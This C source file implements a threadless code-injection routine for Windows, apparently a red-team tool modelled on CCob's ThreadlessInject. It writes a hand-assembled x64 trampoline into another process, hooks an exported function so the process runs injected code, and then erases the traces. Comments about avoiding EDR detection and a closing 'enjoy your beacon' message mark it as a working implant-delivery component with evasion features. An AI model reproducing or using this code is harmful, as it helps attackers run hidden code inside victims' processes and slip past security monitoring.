/****************************************************************/
/* Technique roughtly inspired from Threadless Inject by CCob:  */
/* https://github.com/CCob/ThreadlessInject                     */
/****************************************************************/

#include "headers.h"
/****************************************************************/
/* This function compel a remote process to execute a given     */
/* code using the threadless injection technique                */
/****************************************************************/
BOOLEAN threadlessThread(NTDLLAPI* ntdll, HANDLE processHandle, PVOID executableCodeAddress, PVOID exportAddress) {
    PBYTE trampoline = calloc(76, sizeof(BYTE));
    if (!trampoline) { return FALSE; }    
    
    // This trampoline is used to save the function inital context and redirect to
    // the memory space containing the malicious code. Then, once the malicious code
    // is executed, it will restore the context and redirect to the initial code.
    BYTE trampolineStk[75] = {
        0x58,                                                           // pop RAX
        0x48, 0x83, 0xe8, 0x0c,                                         // sub RAX, 0x0C                    : when the function will return, it will not return to the next instruction but to the previous one
        0x50,                                                           // push RAX
        0x55,															// PUSH RBP
        0x48, 0x89, 0xE5,                                               // MOV RBP, RSP
        0x48, 0x83, 0xec, 0x08,                                         // SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
        0x51,                                                           // push RCX                         : just save the context registers
        0x52,                                                           // push RDX
        0x41, 0x50,                                                     // push R8
        0x41, 0x51,                                                     // push R9
        0x41, 0x52,                                                     // push R10
        0x41, 0x53,                                                     // push R11
        0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // movabs RCX, 0x0000000000000000   : restore the hooked function code
        0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // movabs RDX, 0x0000000000000000   : restore the hooked function code
        0x48, 0x89, 0x08,                                               // mov qword ptr[rax], rcx          : restore the hooked function code
        0x48, 0x89, 0x50, 0x08,                                         // mov qword ptr[rax+0x8], rdx      : restore the hooked function code
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov RAX, 0x0000000000000000      : Address where the execution flow will be redirected
        0xff, 0xd0,                                                     // call RAX                         : Call the malicious code
        0x41, 0x5b,                                                     // pop R11                          : Restore the context
        0x41, 0x5a,                                                     // pop R10
        0x41, 0x59,                                                     // pop R9
        0x41, 0x58,                                                     // pop R8
        0x5a,                                                           // pop RDX
        0x59,                                                           // pop RCX
        0xc9,                                                           // leave
        0xc3                                                            // ret      
    };
    DWORD trampSize = 75;
    CopyMemory(trampoline, trampolineStk, trampSize * sizeof(BYTE));

    DWORD64 highBytePatched = 0;
    DWORD64 lowBytePatched = 0;
    SIZE_T szOutput = 0;

    // Save the instruction of the hooked function
    // It is mandatory to save this information in order to be able
    // to restore the hook once the execution finished
    BOOLEAN status = ntdll->api.NtReadVirtualMemory(processHandle, exportAddress, &highBytePatched, sizeof(DWORD64), &szOutput);
    status = ntdll->api.NtReadVirtualMemory(processHandle, (PVOID)((DWORD64)exportAddress + sizeof(DWORD64)), &lowBytePatched, sizeof(DWORD64), &szOutput);
    PVOID pageToProtect = exportAddress;


    SIZE_T pageSize = 2 * sizeof(DWORD64);
    DWORD oldProtect;
    NTSTATUS ntStatus = ntdll->api.NtProtectVirtualMemory(processHandle, &pageToProtect, &pageSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    DWORD64 tmp = highBytePatched;
    
    // Replace the place holders in the trampoline shellcode
    // with the righ values
    CopyMemory(trampoline + 26, &highBytePatched, sizeof(DWORD64));
    CopyMemory(trampoline + 36, &lowBytePatched, sizeof(DWORD64));
    CopyMemory(trampoline + 53, &executableCodeAddress, sizeof(DWORD64));


    // Write the trampoline somewhere in memory
    // Here VirtualAlloc is used, but some code cave can be used to limit this call
    // As the trampoline size is lesser than 4Ko, we should be ok for EDR detections
    PVOID trampolineAddress = NULL;
    SIZE_T trampolineSize = trampSize * sizeof(BYTE);
    ntStatus = ntdll->api.NtAllocateVirtualMemory(processHandle, &trampolineAddress, 0, &trampolineSize, MEM_COMMIT, PAGE_READWRITE);
    status = NT_SUCCESS(ntStatus);
    ntStatus = ntdll->api.NtWriteVirtualMemory(processHandle, trampolineAddress, trampoline, trampolineSize, &szOutput);
    status = NT_SUCCESS(ntStatus);
    ntStatus = ntdll->api.NtProtectVirtualMemory(processHandle, &trampolineAddress, &trampolineSize, PAGE_EXECUTE_READ, &szOutput);
    status = NT_SUCCESS(ntStatus);


    // Create the hook that will be placed in the remote function
    PBYTE shellcode = calloc(12, sizeof(BYTE));
    if (!shellcode) { return FALSE; }
    BYTE shellcodeStk[12] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov RAX, 0x0000000000000000
        0xFF, 0xD0                                                  // call RAX
    };

    // Replace the place holder
    CopyMemory(shellcode, shellcodeStk, 12 * sizeof(BYTE));
    CopyMemory(shellcode + 2, &trampolineAddress, sizeof(DWORD64));
    // Write the hook in memory
    ntStatus = ntdll->api.NtWriteVirtualMemory(processHandle, exportAddress, shellcode, 12 * sizeof(BYTE), &szOutput);
    PBYTE exportContent = calloc(12, sizeof(BYTE));
    if (!exportContent) { return FALSE; }
    DWORD hookCalled = 0;
    
    do {
        DEBUG("[-] Waiting 10 seconds for the hook to be called...\n");
        Sleep(10000);
        // Check if the hook has been re-patched ie has been successfully executed
        ntStatus = ntdll->api.NtReadVirtualMemory(processHandle, exportAddress, exportContent, 12 * sizeof(BYTE), &szOutput);
        hookCalled = memcmp(shellcode, exportContent, 12 * sizeof(BYTE));
    } while (!hookCalled);

    // Just remove all artifacts in memory
    DEBUG("[+] Hook called ! Releasing artifacts\n");
    ntStatus = ntdll->api.NtFreeVirtualMemory(processHandle, &trampolineAddress, NULL, MEM_DECOMMIT|MEM_RELEASE);
    ntStatus = ntdll->api.NtProtectVirtualMemory(processHandle, &pageToProtect, &pageSize, oldProtect, &oldProtect);
    free(shellcode);
    free(trampoline);
    free(exportContent);
    DEBUG("[+] Artifacts released, enjoy your beacon.\n");
    
    return TRUE;
}